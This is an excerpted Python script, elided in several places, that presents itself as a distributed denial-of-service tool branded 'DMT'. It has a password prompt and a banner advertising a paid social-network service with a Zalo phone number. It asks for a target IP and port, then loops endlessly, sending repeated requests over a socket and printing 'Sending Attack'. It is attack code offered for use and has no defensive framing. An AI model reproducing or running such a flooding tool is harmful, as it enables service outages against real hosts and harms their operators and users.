...
for i in range(3):
    ...
    if (pwd == kevin):
        ...
        time.sleep(5)
        print("[V1] Invalid Password [V1]\n")
        continue
time.sleep(2)
print("[V1] Welcome To Tools V1 by DMT [V1]")
time.sleep(2)
...
os.system("cls")
print("[+]       Tool DDOS DMT [v1]              [+|")
print(" |=========================================|")
print(" |   DichVuMangXaHoi Zalo : 0337021245     |")    
print(" |=========================================|")
print(" | Distributed Denial of Service Tool [v1] | ")
print(" |=========================================|")
print(" |    Contact Me Zalo :0337021245          |")
print("[+]========================================[+]")

print()
ip = str(input("|ADMIN| Input IP Target: "))
port = int(input("|ADMIN| Port Target: "))
    ...
    while True:
        try:
            ...
            for x in range(60000):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(i +"|ADMIN DMT| Sending Attack [V1]")
        except socket.error:
            s.close()
            print("|ADMIN DMT| Attack LOGS",ip,":",port,"[DangTriProVN123]")
